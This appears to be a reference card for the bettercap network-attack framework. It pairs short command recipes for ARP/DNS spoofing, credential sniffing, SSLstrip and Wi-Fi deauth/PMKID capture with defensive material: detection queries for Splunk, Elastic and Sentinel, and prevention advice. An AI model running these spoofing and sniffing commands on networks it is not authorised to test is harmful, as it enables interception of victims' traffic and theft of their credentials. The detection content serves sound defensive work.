name: bettercap - MitM / Network Attack Framework
description: bettercap is a modular framework for network and wireless attacks: ARP/DNS spoofing and MitM, transparent HTTP/HTTPS proxying and credential sniffing, a caplet/scripting engine, BLE and Wi-Fi modules (recon, deauth, PMKID association), and a web UI. The Swiss-army knife for on-path LAN and RF attacks.
notes:
=== START ===
  bettercap -iface <interface>           # interactive session
  bettercap -iface <interface> -caplet <file>   # run a caplet script

=== LAN MITM (inside the session) ===
  net.probe on                           # discover hosts
  net.show
  set arp.spoof.targets <ip>
  arp.spoof on
  net.sniff on                           # capture creds/traffic
  set dns.spoof.domains example.com ; dns.spoof on

=== HTTPS / CREDS ===
  # use the https proxy + sniffer modules / caplets (e.g. http-ui, hstshijack)
  set http.proxy.sslstrip true ; http.proxy on

=== WIFI ===
  wifi.recon on
  wifi.show
  wifi.deauth <bssid>
  wifi.assoc <bssid>                     # grab PMKID

=== WEB UI ===
  bettercap -caplet http-ui              # http://127.0.0.1

=== ALTERNATIVES ===
  responder (LLMNR/NBT-NS)
  ettercap (classic MitM)
  mitm6 (IPv6 DNS takeover)
  aircrack-ng suite (wifi-only)

recommended.note: aircrack-ng suite for dedicated WPA capture/crack.
mitm6 for IPv6-based MitM in AD networks.

defense.why_it_works: Layer-2 protocols (ARP, LLMNR, unauthenticated DHCP/DNS) trust local broadcasts, so an on-path attacker can poison them to reroute traffic. Combined with SSLstrip/HSTS tricks and Wi-Fi deauth/association, bettercap intercepts credentials and manipulates sessions.
defense.prerequisites: Access to the local network segment (wired or wireless) or RF range for the Wi-Fi modules.
defense.impact: Interception and modification of victim traffic, credential theft, DNS redirection, and Wi-Fi handshake capture.
defense.detection: [MITRE T1557] ARP anomalies (one MAC claiming many IPs, gratuitous ARP storms); duplicate-IP/gateway MAC changes; sudden deauth frames; DHCP/DNS spoofing alerts; IDS ARP-spoof signatures.
defense.artifacts: Switch/IDS ARP-inspection logs, gateway MAC change events, deauth-frame spikes, unexpected DNS answers, SSLstrip downgrade attempts.
defense.splunk_spl:
index=network sourcetype=arp OR tag=arp
| stats dc(src_mac) as macs by src_ip
| where macs > 1
defense.elastic_kql: event.category:network and (arp.opcode:2 or message:"duplicate IP address")
defense.sentinel_kql:
CommonSecurityLog
| where DeviceEventClassID has "arp" or Activity has "ARP"
| summarize Macs=dcount(SourceMACAddress) by SourceIP, bin(TimeGenerated, 5m)
| where Macs > 1
defense.prevention: Dynamic ARP Inspection + DHCP snooping on switches; disable LLMNR/NBT-NS; 802.1X port security; HSTS preload and no plaintext HTTP; encrypted DNS; PMF (802.11w) and WIPS for Wi-Fi; network segmentation and monitoring.

detections.name: ARP spoofing / one IP with multiple MACs (bettercap MitM)
detections.logic:
CommonSecurityLog
| where Activity has "ARP" or DeviceEventClassID has "arp"
| summarize Macs=dcount(SourceMACAddress) by SourceIP, bin(TimeGenerated, 5m)
| where Macs > 1
